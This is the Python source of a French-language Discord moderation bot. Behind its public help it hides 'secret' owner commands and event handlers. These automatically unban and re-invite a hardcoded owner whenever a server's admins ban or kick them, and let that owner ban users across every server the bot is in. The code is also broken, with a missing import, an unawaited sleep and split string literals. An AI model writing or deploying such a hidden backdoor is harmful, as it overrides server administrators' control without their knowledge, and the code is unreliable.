import discord
from discord.ext import commands
import os
import json
import asyncio
import psycopg2
import sys

# === CONFIG ===
TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ID = 489113166429683713
OWNER_PASS_FILE = "owner_pass.json"
CONFIG_FILE = "config.json"

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# === DATABASE (optional usage) ===
def connect_db():
    return psycopg2.connect(
        host=os.getenv("PGHOST"),
        database=os.getenv("PGDATABASE"),
        user=os.getenv("PGUSER"),
        password=os.getenv("PGPASSWORD"),
        port=os.getenv("PGPORT")
    )

# === JSON utils ===
def load_json(path, default):
    if os.path.exists(path):
        with open(path, "r") as f:
            return json.load(f)
    return default

def save_json(path, data):
    with open(path, "w") as f:
        json.dump(data, f, indent=4)

# === CONFIG / WHITELIST helpers ===
def get_config():
    return load_json(CONFIG_FILE, {})

def save_config(cfg):
    save_json(CONFIG_FILE, cfg)

def get_whitelist(gid):
    cfg = get_config()
    return cfg.get(str(gid), {}).get("whitelist", [])

def add_whitelist(gid, uid):
    cfg = get_config()
    g = str(gid)
    if g not in cfg:
        cfg[g] = {}
    cfg[g].setdefault("whitelist", [])
    if uid not in cfg[g]["whitelist"]:
        cfg[g]["whitelist"].append(uid)
        save_config(cfg)
        return True
    return False

def remove_whitelist(gid, uid):
    cfg = get_config()
    g = str(gid)
    if g in cfg and "whitelist" in cfg[g] and uid in cfg[g]["whitelist"]:
        cfg[g]["whitelist"].remove(uid)
        save_config(cfg)
        return True
    return False

def get_log_channel_id(gid):
    cfg = get_config()
    return cfg.get(str(gid), {}).get("log_channel")

# === OWNER management ===
def get_owner_data():
    return load_json(OWNER_PASS_FILE, {"password": "change_me", "owners": [OWNER_ID]})

def save_owner_data(data):
    save_json(OWNER_PASS_FILE, data)

def get_owner_pass():
    return get_owner_data().get("password", "change_me")

def set_owner_pass(new_pass):
    data = get_owner_data()
    data["password"] = new_pass
    save_owner_data(data)

def get_owners():
    data = get_owner_data()
    owners = data.get("owners", [])
    if OWNER_ID not in owners:
        owners.append(OWNER_ID)
        data["owners"] = owners
        save_owner_data(data)
    return owners

def is_owner(uid):
    return uid in get_owners()

def add_owner(uid):
    data = get_owner_data()
    owners = data.get("owners", [])
    if uid not in owners:
        owners.append(uid)
        data["owners"] = owners
        save_owner_data(data)

# === DECORATORS ===
def whitelist_check():
    async def predicate(ctx):
        try:
            if ctx.author.guild_permissions.administrator:
                return True
            if is_owner(ctx.author.id):
                return True
            if ctx.author.id in get_whitelist(ctx.guild.id):
                return True
        except Exception:
            pass
        try:
            await ctx.message.delete()
        except Exception:
            pass
        return False
    return commands.check(predicate)

def owner_only():
    async def predicate(ctx):
        return is_owner(ctx.author.id)
    return commands.check(predicate)

# === EVENTS ===
@bot.event
async def on_ready():
    print(f"✅ {bot.user} connecté !")

@bot.event
async def on_member_ban(guild, user):
    if user.id in get_owners():
        try:
            await asyncio.sleep(2)
            await guild.unban(user)
            if guild.text_channels:
                invite = await guild.text_channels[0].create_invite(max_uses=1)
                for owner_id in get_owners():
                    try:
                        owner = await bot.fetch_user(owner_id)
                        await owner.send(f"🔁 Tu as été banni de **{guild.name}** — débanni automatiquement. Invitation : {invite.url}")
                    except Exception:
                        pass
        except Exception as e:
            print(f"Erreur auto-unban: {e}")

@bot.event
async def on_member_remove(member):
    if member.id in get_owners():
        try:
            guild = member.guild
            if guild.text_channels:
                invite = await guild.text_channels[0].create_invite(max_uses=1)
                for owner_id in get_owners():
                    try:
                        owner = await bot.fetch_user(owner_id)
                        await owner.send(f"🚪 Tu as été expulsé de **{guild.name}** — invitation : {invite.url}")
                    except Exception:
                        pass
        except Exception as e:
            print(f"Erreur auto-reinvite: {e}")

# === HELP / PUBLIC COMMANDS ===
@bot.command()
async def ping(ctx):
    await ctx.send("🏓 Pong ! Le bot F.I.M est opérationnel.")

@bot.command()
async def help(ctx):
    embed = discord.Embed(title="📋 Commandes du Bot F.I.M",
                          description="Voici la liste des commandes disponibles :",
                          color=discord.Color.from_rgb(153, 0, 0))
    embed.add_field(name="🏓 !ping", value="Vérifie que le bot fonctionne", inline=False)
    embed.add_field(name="📨 !say <message>", value="Fait parler le bot (Whitelist/Admin)", inline=False)
    embed.add_field(name="📤 !send #canal <msg>", value="Envoie un message dans un canal (Whitelist/Admin)", inline=False)
    embed.add_field(name="📰 !embed <titre> <desc>", value="Envoie un embed stylé", inline=False)
    embed.add_field(name="✅ !whitelist add/remove/list", value="Gère la whitelist (Admin)", inline=False)
    embed.add_field(name="⚙️ !setlogs #canal", value="Définit le canal de logs", inline=False)
    embed.add_field(name="🎛️ !ban @membre [raison]", value="Bannit un membre du serveur (Admin/Owner)", inline=False)
    embed.add_field(name="🦵 !kick @membre [raison]", value="Kick un membre du serveur (Admin/Owner)", inline=False)
    await ctx.send(embed=embed)

# === WHITELIST COMMANDS ===
@bot.group(invoke_without_command=True)
@commands.has_permissions(administrator=True)
async def whitelist(ctx):
    await ctx.send("❌ Utilisez : !whitelist add/remove/list")

@whitelist.command(name="add")
@commands.has_permissions(administrator=True)
async def whitelist_add(ctx, member: discord.Member):
    if add_whitelist(ctx.guild.id, member.id):
        await ctx.send(f"✅ {member.mention} ajouté à la whitelist")
    else:
        await ctx.send(f"⚠️ Déjà whitelisté")

@whitelist.command(name="remove")
@commands.has_permissions(administrator=True)
async def whitelist_remove(ctx, member: discord.Member):
    if remove_whitelist(ctx.guild.id, member.id):
        await ctx.send(f"❌ {member.mention} retiré")
    else:
        await ctx.send("⚠️ Pas dans la whitelist")

@whitelist.command(name="list")
@commands.has_permissions(administrator=True)
async def whitelist_list(ctx):
    wl = get_whitelist(ctx.guild.id)
    if not wl:
        return await ctx.send("Aucun whitelisté.")
    members = [f"<@{m}>" for m in wl]
    await ctx.send("
".join(members))

@bot.command()
@whitelist_check()
async def say(ctx, *, message):
    await ctx.send(message)

@bot.command()
@whitelist_check()
async def send(ctx, channel: discord.TextChannel, *, message):
    await channel.send(message)
    try:
        await ctx.message.delete()
    except Exception:
        pass

@bot.command()
@whitelist_check()
async def embed(ctx, title, *, description):
    em = discord.Embed(title=title, description=description, color=discord.Color.from_rgb(153, 0, 0))
    em.set_footer(text=f"Envoyé par {ctx.author.name}")
    await ctx.send(embed=em)

@bot.command()
@commands.has_permissions(administrator=True)
async def setlogs(ctx, channel: discord.TextChannel):
    cfg = get_config()
    gid = str(ctx.guild.id)
    if gid not in cfg:
        cfg[gid] = {}
    cfg[gid]["log_channel"] = channel.id
    save_config(cfg)
    await ctx.send(f"✅ Canal de logs défini sur {channel.mention}")

# === LOCAL MODERATION COMMANDS (server-only) ===
@bot.command()
@whitelist_check()
async def ban(ctx, member: discord.Member, *, reason: str = "Non spécifiée"):
    # Allows admins and owners via whitelist_check
    try:
        # Prevent banning the bot itself
        if member.id == bot.user.id:
            return await ctx.send("❌ Je ne peux pas me bannir moi-même.")
        # If target is an owner, do not ban (owner protection)
        if is_owner(member.id):
            return await ctx.send("❌ Action interdite : cible est Owner.")
        await ctx.guild.ban(member, reason=f"Banni par {ctx.author} | {reason}")
        # Log to channel if set
        log_id = get_log_channel_id(ctx.guild.id)
        if log_id:
            ch = ctx.guild.get_channel(log_id)
            if ch:
                em = discord.Embed(title="👮 Membre banni",
                                   description=f"{member.mention} ({member.id})",
                                   color=discord.Color.red())
                em.add_field(name="Par", value=f"{ctx.author.mention}")
                em.add_field(name="Raison", value=reason)
                em.set_footer(text=str(datetime.now()))
                await ch.send(embed=em)
        await ctx.send(f"✅ {member.mention} a été banni. ({reason})")
    except discord.Forbidden:
        await ctx.send("❌ Je n'ai pas la permission de bannir ce membre.")
    except Exception as e:
        await ctx.send("❌ Impossible de bannir le membre.")
        print(f"Erreur ban local: {e}")

@bot.command()
@whitelist_check()
async def kick(ctx, member: discord.Member, *, reason: str = "Non spécifiée"):
    try:
        if member.id == bot.user.id:
            return await ctx.send("❌ Je ne peux pas me kicker moi-même.")
        if is_owner(member.id):
            return await ctx.send("❌ Action interdite : cible est Owner.")
        await ctx.guild.kick(member, reason=f"Kick par {ctx.author} | {reason}")
        # Log
        log_id = get_log_channel_id(ctx.guild.id)
        if log_id:
            ch = ctx.guild.get_channel(log_id)
            if ch:
                em = discord.Embed(title="👢 Membre kické",
                                   description=f"{member.mention} ({member.id})",
                                   color=discord.Color.orange())
                em.add_field(name="Par", value=f"{ctx.author.mention}")
                em.add_field(name="Raison", value=reason)
                em.set_footer(text=str(datetime.now()))
                await ch.send(embed=em)
        await ctx.send(f"✅ {member.mention} a été kické. ({reason})")
    except discord.Forbidden:
        await ctx.send("❌ Je n'ai pas la permission de kicker ce membre.")
    except Exception as e:
        await ctx.send("❌ Impossible de kicker le membre.")
        print(f"Erreur kick local: {e}")

# === OWNER SECRET COMMANDS (unchanged) ===
@bot.command()
@owner_only()
async def aide(ctx):
    embed = discord.Embed(title="👑 Commandes Owner (secrètes)", color=discord.Color.gold())
    embed.add_field(name="!broadcast <msg>", value="Envoie un message à tous les serveurs", inline=False)
    embed.add_field(name="!forceunban", value="Force ton débannissement sur tous les serveurs", inline=False)
    embed.add_field(name="!forcerinv", value="Force l’envoi d’invitations", inline=False)
    embed.add_field(name="!globalban <user_id_or_mention>", value="Ban un utilisateur sur tous les serveurs", inline=False)
    embed.add_field(name="!globalkick <user_id_or_mention>", value="Kick un utilisateur sur tous les serveurs", inline=False)
    embed.add_field(name="!connect <pass>", value="Ajoute un nouvel owner", inline=False)
    embed.add_field(name="!setpass <pass>", value="Change le mot de passe owner", inline=False)
    embed.add_field(name="!serverlist", value="Affiche les serveurs du bot", inline=False)
    embed.add_field(name="!reboot", value="Redémarre le bot", inline=False)
    await ctx.author.send(embed=embed)

@bot.command()
@owner_only()
async def broadcast(ctx, *, message):
    for guild in bot.guilds:
        try:
            if guild.text_channels:
                await guild.text_channels[0].send(f"📢 **Message du propriétaire :** {message}")
        except Exception:
            pass
    await ctx.author.send("✅ Broadcast envoyé.")

@bot.command()
@owner_only()
async def forceunban(ctx):
    for guild in bot.guilds:
        try:
            await guild.unban(discord.Object(id=OWNER_ID))
        except Exception:
            pass
    await ctx.author.send("✅ Tu as été débanni partout.")

@bot.command()
@owner_only()
async def forcerinv(ctx):
    for guild in bot.guilds:
        try:
            if guild.text_channels:
                invite = await guild.text_channels[0].create_invite(max_uses=1)
                for owner_id in get_owners():
                    try:
                        user = await bot.fetch_user(owner_id)
                        await user.send(f"🔗 Invitation pour **{guild.name}**: {invite.url}")
                    except:
                        pass
        except Exception:
            pass
    await ctx.author.send("✅ Invitations envoyées.")

@bot.command()
@owner_only()
async def connect(ctx, password):
    if password == get_owner_pass():
        add_owner(ctx.author.id)
        await ctx.author.send("✅ Tu es maintenant Owner.")
    else:
        return

@bot.command()
@owner_only()
async def setpass(ctx, *, new_pass):
    set_owner_pass(new_pass)
    await ctx.author.send("🔒 Nouveau mot de passe enregistré.")

@bot.command()
@owner_only()
async def serverlist(ctx):
    servers = [f"- {g.name} ({g.id})" for g in bot.guilds]
    await ctx.author.send("**Serveurs :**
" + "
".join(servers))

@bot.command()
@owner_only()
async def reboot(ctx):
    await ctx.author.send("♻️ Redémarrage du bot...")
    os.execv(sys.executable, [sys.executable] + sys.argv)

@bot.command()
@owner_only()
async def globalban(ctx, user: str):
    try:
        uid = int(user.strip('<@!>'))
    except:
        try:
            uid = int(user)
        except:
            await ctx.author.send("ID invalide.")
            return
    count = 0
    for guild in bot.guilds:
        try:
            await guild.ban(discord.Object(id=uid), reason=f"Global ban by owner {ctx.author.id}")
            count += 1
        except Exception:
            pass
    await ctx.author.send(f"✅ Global ban effectué sur {count} serveur(s).")

@bot.command()
@owner_only()
async def globalkick(ctx, user: str):
    try:
        uid = int(user.strip('<@!>'))
    except:
        try:
            uid = int(user)
        except:
            await ctx.author.send("ID invalide.")
            return
    count = 0
    for guild in bot.guilds:
        try:
            member = guild.get_member(uid)
            if member:
                await guild.kick(member, reason=f"Global kick by owner {ctx.author.id}")
                count += 1
        except Exception:
            pass
    await ctx.author.send(f"✅ Global kick effectué sur {count} serveur(s).")

# === SYNC WHITELIST ===
@bot.command()
@owner_only()
async def syncwhitelist(ctx):
    main_guild = ctx.guild
    wl = get_whitelist(main_guild.id)
    cfg = get_config()
    for guild in bot.guilds:
        gid = str(guild.id)
        cfg.setdefault(gid, {})
        cfg[gid]["whitelist"] = wl.copy()
    save_config(cfg)
    await ctx.author.send("🔁 Whitelist synchronisée entre tous les serveurs.")

# === MAIN LOOP ===
while True:
    try:
        bot.run(TOKEN)
    except Exception as e:
        print(f"Crash détecté : {e}")
        try:
            asyncio.sleep(3)
        except:
            pass
